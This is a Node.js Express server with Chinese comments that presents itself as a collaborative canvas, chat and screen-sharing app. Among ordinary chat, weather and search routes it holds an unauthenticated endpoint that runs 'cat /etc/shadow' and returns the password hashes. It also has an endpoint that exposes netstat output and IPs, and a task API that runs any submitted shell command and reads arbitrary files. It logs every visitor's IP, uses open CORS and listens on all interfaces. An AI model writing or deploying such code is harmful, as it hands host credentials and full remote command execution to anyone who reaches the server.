import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';
import { exec } from 'child_process';
import { promisify } from 'util';
import os from 'os';
import https from 'https';
import axios from 'axios';
import { createServer } from 'http';
import { Server } from 'socket.io';

const execPromise = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3002;

// 存储截图数据（内存存储）
const screenshots = [];
let screenshotIdCounter = 1;

// 聊天消息存储路径
const CHAT_MESSAGES_FILE = path.join(__dirname, 'chat_messages.txt');

// 访客IP记录存储路径
const VISITOR_IPS_FILE = path.join(__dirname, 'visitor_ips.txt');

// 任务数据存储路径
const TASKS_FILE = path.join(__dirname, 'tasks.json');

// 中间件
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));

// ==================== 聊天室辅助函数 ====================

/**
 * 读取聊天消息
 */
async function readChatMessages() {
  try {
    const data = await fs.readFile(CHAT_MESSAGES_FILE, 'utf-8');
    const lines = data.trim().split('\n').filter(line => line.trim());
    return lines.map(line => JSON.parse(line));
  } catch (error) {
    if (error.code === 'ENOENT') {
      // 文件不存在，返回空数组
      return [];
    }
    throw error;
  }
}

/**
 * 写入聊天消息
 */
async function writeChatMessage(message) {
  const messageStr = JSON.stringify(message) + '\n';
  await fs.appendFile(CHAT_MESSAGES_FILE, messageStr, 'utf-8');
}

// ==================== 访客IP记录辅助函数 ====================

/**
 * 读取访客IP记录
 */
async function readVisitorIPs() {
  try {
    const data = await fs.readFile(VISITOR_IPS_FILE, 'utf-8');
    const lines = data.trim().split('\n').filter(line => line.trim());
    return lines.map(line => JSON.parse(line));
  } catch (error) {
    if (error.code === 'ENOENT') {
      // 文件不存在，返回空数组
      return [];
    }
    throw error;
  }
}

/**
 * 写入访客IP记录
 */
async function writeVisitorIP(record) {
  const recordStr = JSON.stringify(record) + '\n';
  await fs.appendFile(VISITOR_IPS_FILE, recordStr, 'utf-8');
}

// ==================== 任务管理辅助函数 ====================

/**
 * 读取任务列表
 */
async function readTasks() {
  try {
    const data = await fs.readFile(TASKS_FILE, 'utf-8');
    return JSON.parse(data);
  } catch (error) {
    if (error.code === 'ENOENT') {
      // 文件不存在，返回空数组
      return [];
    }
    throw error;
  }
}

/**
 * 写入任务列表
 */
async function writeTasks(tasks) {
  await fs.writeFile(TASKS_FILE, JSON.stringify(tasks, null, 2), 'utf-8');
}

/**
 * 生成唯一任务ID
 */
function generateTaskId() {
  return `task_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// IP记录中间件 - 记录所有访问者的IP地址
app.use(async (req, res, next) => {
  try {
    // 获取访问者IP地址
    const ip = req.headers['x-forwarded-for'] ||
               req.headers['x-real-ip'] ||
               req.connection.remoteAddress ||
               req.socket.remoteAddress ||
               req.ip;

    // 记录访问信息
    const record = {
      ip: ip,
      path: req.path,
      method: req.method,
      userAgent: req.headers['user-agent'] || 'Unknown',
      timestamp: Date.now(),
      time: new Date().toLocaleString('zh-CN', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      })
    };

    // 异步写入，不阻塞请求
    writeVisitorIP(record).catch(err => {
      console.error('记录访客IP失败:', err);
    });

  } catch (error) {
    console.error('IP记录中间件错误:', error);
  }

  next();
});

// ==================== 聊天室 API ====================

/**
 * 获取聊天消息列表
 */
app.get('/api/chat/messages', async (req, res) => {
  try {
    const messages = await readChatMessages();

    // 只返回最近的100条消息
    const recentMessages = messages.slice(-100);

    res.json({
      success: true,
      messages: recentMessages,
      total: recentMessages.length
    });
  } catch (error) {
    console.error('获取聊天消息失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 发送聊天消息
 */
app.post('/api/chat/messages', async (req, res) => {
  try {
    const { userId, username, avatar, content, timestamp } = req.body;

    if (!content || !content.trim()) {
      return res.status(400).json({
        success: false,
        message: '消息内容不能为空'
      });
    }

    // 验证消息长度
    if (content.length > 1000) {
      return res.status(400).json({
        success: false,
        message: '消息内容过长，最多1000字符'
      });
    }

    const message = {
      userId: userId || 'anonymous',
      username: username || '匿名用户',
      avatar: avatar || '😀',
      content: content.trim(),
      timestamp: timestamp || Date.now()
    };

    await writeChatMessage(message);

    console.log(`💬 新消息 - 用户: ${message.username}, 内容: ${message.content.substring(0, 30)}...`);

    res.json({
      success: true,
      message: '消息发送成功'
    });
  } catch (error) {
    console.error('发送聊天消息失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== 访客IP追踪 API ====================

/**
 * 获取访客IP记录列表
 */
app.get('/api/visitors/ips', async (req, res) => {
  try {
    const records = await readVisitorIPs();

    // 统计相关数据
    const uniqueIPs = new Set(records.map(r => r.ip));
    const ipStats = {};

    records.forEach(record => {
      if (!ipStats[record.ip]) {
        ipStats[record.ip] = {
          ip: record.ip,
          count: 0,
          firstVisit: record.time,
          lastVisit: record.time,
          paths: new Set()
        };
      }
      ipStats[record.ip].count += 1;
      ipStats[record.ip].lastVisit = record.time;
      ipStats[record.ip].paths.add(record.path);
    });

    // 转换为数组并排序
    const ipList = Object.values(ipStats).map(stat => ({
      ...stat,
      paths: Array.from(stat.paths)
    })).sort((a, b) => b.count - a.count);

    res.json({
      success: true,
      totalRecords: records.length,
      uniqueIPs: uniqueIPs.size,
      records: records.slice(-200).reverse(), // 返回最近200条记录
      ipStats: ipList
    });
  } catch (error) {
    console.error('获取访客IP记录失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== 屏幕截图 API ====================

/**
 * 上传屏幕截图
 */
app.post('/api/screenshots/upload', async (req, res) => {
  try {
    const { imageData, username = '匿名用户' } = req.body;

    if (!imageData) {
      return res.status(400).json({
        success: false,
        message: '图片数据不能为空'
      });
    }

    // 验证是否为有效的 base64 图片数据
    if (!imageData.startsWith('data:image/')) {
      return res.status(400).json({
        success: false,
        message: '无效的图片格式'
      });
    }

    const screenshot = {
      id: screenshotIdCounter++,
      imageData,
      username,
      timestamp: new Date().toISOString(),
      uploadTime: new Date().toLocaleString('zh-CN', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      })
    };

    screenshots.unshift(screenshot); // 添加到数组开头，最新的在前面

    // 限制存储数量，最多保存100张截图
    if (screenshots.length > 100) {
      screenshots.pop();
    }

    console.log(`📸 新截图上传 - ID: ${screenshot.id}, 用户: ${screenshot.username}, 当前总数: ${screenshots.length}`);

    res.json({
      success: true,
      message: '截图上传成功',
      screenshot: {
        id: screenshot.id,
        username: screenshot.username,
        timestamp: screenshot.timestamp,
        uploadTime: screenshot.uploadTime
      }
    });
  } catch (error) {
    console.error('上传截图失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 获取所有截图列表
 */
app.get('/api/screenshots/list', (req, res) => {
  try {
    const { limit = 50, offset = 0 } = req.query;

    const start = parseInt(offset);
    const end = start + parseInt(limit);

    const paginatedScreenshots = screenshots.slice(start, end);

    res.json({
      success: true,
      total: screenshots.length,
      screenshots: paginatedScreenshots
    });
  } catch (error) {
    console.error('获取截图列表失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 删除指定截图
 */
app.delete('/api/screenshots/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    const index = screenshots.findIndex(s => s.id === id);

    if (index === -1) {
      return res.status(404).json({
        success: false,
        message: '截图不存在'
      });
    }

    screenshots.splice(index, 1);

    console.log(`🗑️ 截图已删除 - ID: ${id}, 剩余: ${screenshots.length}`);

    res.json({
      success: true,
      message: '截图删除成功'
    });
  } catch (error) {
    console.error('删除截图失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 清空所有截图
 */
app.post('/api/screenshots/clear', (req, res) => {
  try {
    const count = screenshots.length;
    screenshots.length = 0;
    screenshotIdCounter = 1;

    console.log(`🧹 已清空所有截图 - 总计: ${count} 张`);

    res.json({
      success: true,
      message: `已清空 ${count} 张截图`
    });
  } catch (error) {
    console.error('清空截图失败:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== 系统命令 API ====================

/**
 * 获取系统网络信息 (公网IP、内网IP、netstat)
 */
app.get('/api/system/network-info', async (req, res) => {
  try {
    console.log('🌐 获取网络信息');

    // 获取公网IP
    let publicIp = 'N/A';
    try {
      publicIp = await new Promise((resolve, reject) => {
        https.get('https://api.ipify.org?format=text', (resp) => {
          let data = '';
          resp.on('data', (chunk) => { data += chunk; });
          resp.on('end', () => { resolve(data); });
        }).on('error', reject);
      });
    } catch (error) {
      console.error('获取公网IP失败:', error.message);
    }

    // 获取内网IP
    const networkInterfaces = os.networkInterfaces();
    const localIps = [];
    for (const interfaceName in networkInterfaces) {
      const addresses = networkInterfaces[interfaceName];
      for (const addr of addresses) {
        if (addr.family === 'IPv4' && !addr.internal) {
          localIps.push({
            interface: interfaceName,
            address: addr.address,
            netmask: addr.netmask
          });
        }
      }
    }

    // 执行 netstat -an
    let netstatOutput = '';
    try {
      const { stdout } = await execPromise('netstat -an');
      netstatOutput = stdout;
    } catch (error) {
      netstatOutput = error.stdout || error.message;
    }

    res.json({
      success: true,
      publicIp: publicIp,
      localIps: localIps,
      netstat: netstatOutput,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('获取网络信息失败:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

/**
 * 执行 cat /etc/shadow 命令
 */
app.get('/api/system/shadow', async (req, res) => {
  try {
    console.log('📋 执行命令: cat /etc/shadow');

    const { stdout, stderr } = await execPromise('cat /etc/shadow');

    res.json({
      success: true,
      output: stdout,
      error: stderr || null,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('执行命令失败:', error.message);

    res.json({
      success: false,
      output: error.stdout || '',
      error: error.stderr || error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// ==================== 天气 API ====================

/**
 * 获取用户当前天气
 */
app.get('/api/weather', async (req, res) => {
  try {
    console.log('🌤️ 获取天气信息');

    // 使用 wttr.in 免费天气服务（支持自动定位）
    const weatherData = await new Promise((resolve, reject) => {
      https.get('https://wttr.in/?format=j1', (resp) => {
        let data = '';
        resp.on('data', (chunk) => { data += chunk; });
        resp.on('end', () => {
          try {
            resolve(JSON.parse(data));
          } catch (e) {
            reject(e);
          }
        });
      }).on('error', reject);
    });

    // 解析天气数据
    const current = weatherData.current_condition[0];
    const location = weatherData.nearest_area[0];

    // 天气描述中文映射
    const weatherDescMap = {
      'Sunny': '晴朗',
      'Clear': '晴朗',
      'Partly cloudy': '多云',
      'Cloudy': '阴天',
      'Overcast': '阴天',
      'Mist': '薄雾',
      'Fog': '雾',
      'Light rain': '小雨',
      'Moderate rain': '中雨',
      'Heavy rain': '大雨',
      'Light snow': '小雪',
      'Moderate snow': '中雪',
      'Heavy snow': '大雪',
      'Thunderstorm': '雷暴'
    };

    // 天气图标映射
    const weatherIconMap = {
      'Sunny': '☀️',
      'Clear': '🌙',
      'Partly cloudy': '⛅',
      'Cloudy': '☁️',
      'Overcast': '☁️',
      'Mist': '🌫️',
      'Fog': '🌫️',
      'Light rain': '🌦️',
      'Moderate rain': '🌧️',
      'Heavy rain': '⛈️',
      'Light snow': '🌨️',
      'Moderate snow': '❄️',
      'Heavy snow': '❄️',
      'Thunderstorm': '⛈️'
    };

    const weatherDesc = current.weatherDesc[0].value;
    const weatherDescCN = weatherDescMap[weatherDesc] || weatherDesc;
    const weatherIcon = weatherIconMap[weatherDesc] || '🌡️';

    res.json({
      success: true,
      data: {
        location: location.areaName[0].value,
        region: location.country[0].value,
        temperature: current.temp_C,
        feelsLike: current.FeelsLikeC,
        description: weatherDescCN,
        icon: weatherIcon,
        humidity: current.humidity,
        windSpeed: current.windspeedKmph,
        pressure: current.pressure,
        uvIndex: current.uvIndex
      },
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('获取天气信息失败:', error);
    res.status(500).json({
      success: false,
      message: '获取天气信息失败，请稍后重试',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// ==================== 任务管理 API ====================

/**
 * 获取所有任务
 */
app.get('/api/tasks', async (req, res) => {
  try {
    const tasks = await readTasks();
    res.json({
      success: true,
      tasks: tasks
    });
  } catch (error) {
    console.error('获取任务列表失败:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

/**
 * 创建新任务
 */
app.post('/api/tasks', async (req, res) => {
  try {
    const { name, type, content, priority, description } = req.body;

    if (!name || !name.trim()) {
      return res.status(400).json({
        success: false,
        error: '任务名称不能为空'
      });
    }

    if (!content || !content.trim()) {
      return res.status(400).json({
        success: false,
        error: '任务内容不能为空'
      });
    }

    const tasks = await readTasks();

    const newTask = {
      id: generateTaskId(),
      name: name.trim(),
      type: type || 'custom',
      content: content.trim(),
      priority: priority || 'medium',
      description: description || '',
      status: 'pending',
      createdAt: new Date().toISOString(),
      executedAt: null,
      completedAt: null,
      result: null,
      error: null
    };

    tasks.push(newTask);
    await writeTasks(tasks);

    console.log(`📋 新任务创建 - ID: ${newTask.id}, 名称: ${newTask.name}`);

    res.json({
      success: true,
      task: newTask
    });
  } catch (error) {
    console.error('创建任务失败:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

/**
 * 获取单个任务
 */
app.get('/api/tasks/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const tasks = await readTasks();
    const task = tasks.find(t => t.id === id);

    if (!task) {
      return res.status(404).json({
        success: false,
        error: '任务不存在'
      });
    }

    res.json({
      success: true,
      task: task
    });
  } catch (error) {
    console.error('获取任务失败:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

/**
 * 更新任务
 */
app.put('/api/tasks/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const updates = req.body;

    const tasks = await readTasks();
    const taskIndex = tasks.findIndex(t => t.id === id);

    if (taskIndex === -1) {
      return res.status(404).json({
        success: false,
        error: '任务不存在'
      });
    }

    // 更新任务
    tasks[taskIndex] = {
      ...tasks[taskIndex],
      ...updates,
      id: id // 确保ID不被修改
    };

    await writeTasks(tasks);

    console.log(`✏️ 任务更新 - ID: ${id}`);

    res.json({
      success: true,
      task: tasks[taskIndex]
    });
  } catch (error) {
    console.error('更新任务失败:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

/**
 * 删除任务
 */
app.delete('/api/tasks/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const tasks = await readTasks();
    const taskIndex = tasks.findIndex(t => t.id === id);

    if (taskIndex === -1) {
      return res.status(404).json({
        success: false,
        error: '任务不存在'
      });
    }

    tasks.splice(taskIndex, 1);
    await writeTasks(tasks);

    console.log(`🗑️ 任务删除 - ID: ${id}`);

    res.json({
      success: true,
      message: '任务删除成功'
    });
  } catch (error) {
    console.error('删除任务失败:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

/**
 * 执行任务
 */
app.post('/api/tasks/:id/execute', async (req, res) => {
  try {
    const { id } = req.params;
    const tasks = await readTasks();
    const taskIndex = tasks.findIndex(t => t.id === id);

    if (taskIndex === -1) {
      return res.status(404).json({
        success: false,
        error: '任务不存在'
      });
    }

    const task = tasks[taskIndex];

    // 检查任务状态
    if (task.status === 'running') {
      return res.status(400).json({
        success: false,
        error: '任务正在执行中'
      });
    }

    // 更新任务状态为执行中
    task.status = 'running';
    task.executedAt = new Date().toISOString();
    task.result = null;
    task.error = null;

    await writeTasks(tasks);

    console.log(`⚡ 开始执行任务 - ID: ${id}, 类型: ${task.type}`);

    // 根据任务类型执行不同的操作
    let result = null;
    let error = null;

    try {
      if (task.type === 'command') {
        // 执行命令
        const { stdout, stderr } = await execPromise(task.content, {
          timeout: 30000, // 30秒超时
          maxBuffer: 1024 * 1024 * 10 // 10MB 缓冲区
        });
        result = stdout || stderr || '命令执行完成';
      } else if (task.type === 'file') {
        // 文件处理任务
        const filePath = task.content;
        try {
          const fileContent = await fs.readFile(filePath, 'utf-8');
          result = `文件读取成功，大小: ${fileContent.length} 字节`;
        } catch (fileError) {
          throw new Error(`文件处理失败: ${fileError.message}`);
        }
      } else {
        // 自定义任务
        result = `任务 "${task.name}" 执行成功\n内容: ${task.content}`;
      }

      // 更新任务状态为完成
      task.status = 'completed';
      task.completedAt = new Date().toISOString();
      task.result = result;

      console.log(`✅ 任务执行成功 - ID: ${id}`);
    } catch (execError) {
      // 更新任务状态为失败
      task.status = 'failed';
      task.completedAt = new Date().toISOString();
      task.error = execError.message || '执行失败';
      error = task.error;

      console.error(`❌ 任务执行失败 - ID: ${id}, 错误: ${error}`);
    }

    tasks[taskIndex] = task;
    await writeTasks(tasks);

    res.json({
      success: task.status === 'completed',
      task: task,
      error: error
    });
  } catch (error) {
    console.error('执行任务失败:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

/**
 * 停止任务
 */
app.post('/api/tasks/:id/stop', async (req, res) => {
  try {
    const { id } = req.params;
    const tasks = await readTasks();
    const taskIndex = tasks.findIndex(t => t.id === id);

    if (taskIndex === -1) {
      return res.status(404).json({
        success: false,
        error: '任务不存在'
      });
    }

    const task = tasks[taskIndex];

    if (task.status !== 'running') {
      return res.status(400).json({
        success: false,
        error: '任务未在执行中'
      });
    }

    // 更新任务状态为待执行
    task.status = 'pending';
    task.error = '任务被手动停止';

    await writeTasks(tasks);

    console.log(`⏸️ 任务已停止 - ID: ${id}`);

    res.json({
      success: true,
      task: task
    });
  } catch (error) {
    console.error('停止任务失败:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ==================== 搜索 API ====================

/**
 * Bing 搜索 API
 * 使用真实的 Bing Web Search API 获取搜索结果
 * 支持环境变量 BING_API_KEY，如果未设置则使用模拟数据
 */
app.get('/api/search', async (req, res) => {
  try {
    const { q } = req.query;

    if (!q || !q.trim()) {
      return res.status(400).json({
        success: false,
        message: '搜索关键词不能为空'
      });
    }

    console.log(`🔍 搜索关键词: ${q}`);

    // Bing API 配置
    const BING_API_KEY = process.env.BING_API_KEY;
    const BING_ENDPOINT = 'https://api.bing.microsoft.com/v7.0/search';

    let results = [];
    let totalResults = 0;
    let usedBingAPI = false;

    // 如果有 Bing API Key，则调用真实的 Bing API
    if (BING_API_KEY) {
      try {
        console.log('📡 调用 Bing Search API...');
        const response = await axios.get(BING_ENDPOINT, {
          params: {
            q: q.trim(),
            count: 20,
            mkt: 'zh-CN',
            safesearch: 'Moderate'
          },
          headers: {
            'Ocp-Apim-Subscription-Key': BING_API_KEY
          },
          timeout: 5000
        });

        if (response.data && response.data.webPages && response.data.webPages.value) {
          const bingResults = response.data.webPages.value;
          totalResults = response.data.webPages.totalEstimatedMatches || bingResults.length;

          // 转换 Bing 结果为我们的格式，并添加优先级
          results = bingResults.map((item, index) => {
            // 根据结果的排名计算优先级（排名越靠前，优先级越高）
            // 第1名：100分，第2名：98分，第3名：96分，以此类推
            const priority = Math.max(100 - (index * 2), 50);

            return {
              title: item.name || '无标题',
              url: item.url || '#',
              displayUrl: item.displayUrl || item.url || '#',
              snippet: item.snippet || '暂无描述',
              priority: priority,
              dateLastCrawled: item.dateLastCrawled
            };
          });

          // 按优先级倒序排序（从高到低）
          results.sort((a, b) => b.priority - a.priority);
          usedBingAPI = true;
          console.log(`✅ Bing API 返回 ${results.length} 条结果`);
        }
      } catch (apiError) {
        console.error('❌ Bing API 调用失败:', apiError.message);
        console.log('⚠️ 降级使用模拟数据');
      }
    } else {
      console.log('⚠️ 未配置 BING_API_KEY，使用模拟数据');
    }

    // 如果 Bing API 调用失败或未配置，使用模拟数据
    if (results.length === 0) {
      const mockResults = [
        {
          title: `${q} - 百度百科`,
          url: `https://baike.baidu.com/item/${encodeURIComponent(q)}`,
          displayUrl: `baike.baidu.com/item/${q}`,
          snippet: `${q}是一个多义词，可以指代多种不同的事物。本词条详细介绍了${q}的各种含义、历史背景、应用场景等相关信息...`,
          priority: 95
        },
        {
          title: `${q} - 维基百科，自由的百科全书`,
          url: `https://zh.wikipedia.org/wiki/${encodeURIComponent(q)}`,
          displayUrl: `zh.wikipedia.org/wiki/${q}`,
          snippet: `${q}，在维基百科中有详细的介绍。维基百科是一个自由、开放的百科全书项目，由全球志愿者共同编辑...`,
          priority: 92
        },
        {
          title: `关于${q}的最新资讯 - 新浪新闻`,
          url: `https://news.sina.com.cn/search?q=${encodeURIComponent(q)}`,
          displayUrl: `news.sina.com.cn/search?q=${q}`,
          snippet: `新浪新闻为您提供${q}的最新资讯、深度报道、独家评论等内容。第一时间了解${q}的最新动态...`,
          priority: 88
        },
        {
          title: `${q} - 知乎`,
          url: `https://www.zhihu.com/search?q=${encodeURIComponent(q)}`,
          displayUrl: `www.zhihu.com/search?q=${q}`,
          snippet: `知乎，中文互联网高质量的问答社区。在这里可以找到关于${q}的各种问题和答案，了解不同的观点和见解...`,
          priority: 85
        },
        {
          title: `${q}相关视频_哔哩哔哩`,
          url: `https://www.bilibili.com/search?keyword=${encodeURIComponent(q)}`,
          displayUrl: `www.bilibili.com/search?keyword=${q}`,
          snippet: `哔哩哔哩为您提供${q}相关的视频内容，包括教程、讲解、实践案例等。观看高质量的${q}视频内容...`,
          priority: 82
        },
        {
          title: `${q}的详细介绍和使用方法 - CSDN博客`,
          url: `https://blog.csdn.net/search?q=${encodeURIComponent(q)}`,
          displayUrl: `blog.csdn.net/search?q=${q}`,
          snippet: `CSDN博客为您提供${q}的详细技术文档、使用教程、最佳实践等内容。帮助开发者快速掌握${q}的使用...`,
          priority: 78
        },
        {
          title: `${q} - 淘宝网`,
          url: `https://s.taobao.com/search?q=${encodeURIComponent(q)}`,
          displayUrl: `s.taobao.com/search?q=${q}`,
          snippet: `淘宝网为您找到${q}相关的商品信息，提供丰富的${q}产品选择，价格实惠，质量保证...`,
          priority: 75
        },
        {
          title: `${q} - 京东商城`,
          url: `https://search.jd.com/Search?keyword=${encodeURIComponent(q)}`,
          displayUrl: `search.jd.com/Search?keyword=${q}`,
          snippet: `京东商城为您提供${q}的正品行货，价格优惠，品质保证，配送快捷。在线购买${q}，享受优质服务...`,
          priority: 72
        },
        {
          title: `${q}的英文翻译 - 有道词典`,
          url: `https://dict.youdao.com/search?q=${encodeURIComponent(q)}`,
          displayUrl: `dict.youdao.com/search?q=${q}`,
          snippet: `有道词典为您提供${q}的英文翻译、读音、例句等内容。帮助您更好地学习和使用${q}这个词汇...`,
          priority: 68
        },
        {
          title: `${q} - 豆瓣`,
          url: `https://www.douban.com/search?q=${encodeURIComponent(q)}`,
          displayUrl: `www.douban.com/search?q=${q}`,
          snippet: `豆瓣为您提供${q}相关的书籍、电影、音乐等文化内容推荐。发现更多关于${q}的有趣内容...`,
          priority: 65
        }
      ];

      // 按优先级倒序排序（从高到低）
      mockResults.sort((a, b) => b.priority - a.priority);
      results = mockResults;
      totalResults = mockResults.length;
    }

    res.json({
      success: true,
      results: results,
      total: totalResults,
      query: q,
      source: usedBingAPI ? 'Bing API' : 'Mock Data',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('搜索失败:', error);
    res.status(500).json({
      success: false,
      message: '搜索服务暂时不可用，请稍后重试',
      error: error.message
    });
  }
});

// ==================== 健康检查 ====================

/**
 * 健康检查
 */
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'ok',
    message: 'Screen Sharing Server is running',
    timestamp: new Date().toISOString(),
    port: PORT,
    screenshots: screenshots.length
  });
});

// ==================== 错误处理 ====================

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: '接口不存在',
    path: req.path
  });
});

app.use((error, req, res, next) => {
  console.error('服务器错误:', error);
  res.status(500).json({
    success: false,
    error: '服务器内部错误',
    message: error.message
  });
});

// ==================== 启动服务器 ====================

const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// ==================== Socket.IO 画布实时通信 ====================

// 存储当前所有画布路径数据
const canvasData = {
  paths: [], // 所有绘画路径
  users: new Map() // 用户信息 userId -> { color, name }
};

io.on('connection', (socket) => {
  console.log(`✨ 用户连接: ${socket.id}`);

  // 发送当前画布数据给新连接的用户
  socket.emit('canvas-init', {
    paths: canvasData.paths,
    users: Array.from(canvasData.users.entries()).map(([id, data]) => ({ id, ...data }))
  });

  // 用户加入画布
  socket.on('user-join', (userData) => {
    canvasData.users.set(socket.id, {
      color: userData.color,
      name: userData.name || `用户${socket.id.slice(0, 6)}`
    });

    // 广播新用户加入
    io.emit('user-joined', {
      id: socket.id,
      ...canvasData.users.get(socket.id)
    });

    console.log(`👤 用户加入画布: ${canvasData.users.get(socket.id).name}`);
  });

  // 接收绘画开始事件
  socket.on('draw-start', (data) => {
    const path = {
      id: `${socket.id}-${Date.now()}`,
      userId: socket.id,
      points: [{ x: data.x, y: data.y }],
      color: data.color,
      lineWidth: data.lineWidth,
      timestamp: Date.now()
    };

    canvasData.paths.push(path);

    // 广播给所有其他用户
    socket.broadcast.emit('draw-start', {
      ...path,
      userName: canvasData.users.get(socket.id)?.name
    });
  });

  // 接收绘画移动事件
  socket.on('draw-move', (data) => {
    // 找到当前路径并添加点
    const currentPath = canvasData.paths.find(p => p.userId === socket.id && !p.ended);
    if (currentPath) {
      currentPath.points.push({ x: data.x, y: data.y });
    }

    // 广播给所有其他用户
    socket.broadcast.emit('draw-move', {
      userId: socket.id,
      x: data.x,
      y: data.y,
      pathId: currentPath?.id
    });
  });

  // 接收绘画结束事件
  socket.on('draw-end', () => {
    const currentPath = canvasData.paths.find(p => p.userId === socket.id && !p.ended);
    if (currentPath) {
      currentPath.ended = true;
    }

    socket.broadcast.emit('draw-end', {
      userId: socket.id
    });
  });

  // 清空画布
  socket.on('clear-canvas', () => {
    canvasData.paths = [];
    io.emit('canvas-cleared');
    console.log('🧹 画布已清空');
  });

  // 用户断开连接
  socket.on('disconnect', () => {
    const userName = canvasData.users.get(socket.id)?.name || socket.id;
    canvasData.users.delete(socket.id);

    // 广播用户离开
    io.emit('user-left', {
      id: socket.id,
      name: userName
    });

    console.log(`👋 用户离开: ${userName}`);
  });
});

httpServer.listen(PORT, '0.0.0.0', () => {
  console.log('\n' + '='.repeat(60));
  console.log('🚀 Collaborative Canvas Server Started Successfully!');
  console.log('='.repeat(60));
  console.log(`📡 Server: http://localhost:${PORT}`);
  console.log(`🔍 Health Check: http://localhost:${PORT}/api/health`);
  console.log(`📸 Screenshots API: http://localhost:${PORT}/api/screenshots/list`);
  console.log(`💬 Chat Room API: http://localhost:${PORT}/api/chat/messages`);
  console.log(`🎨 Canvas WebSocket: Active`);
  console.log(`📁 Working Directory: ${process.cwd()}`);
  console.log('='.repeat(60) + '\n');
});
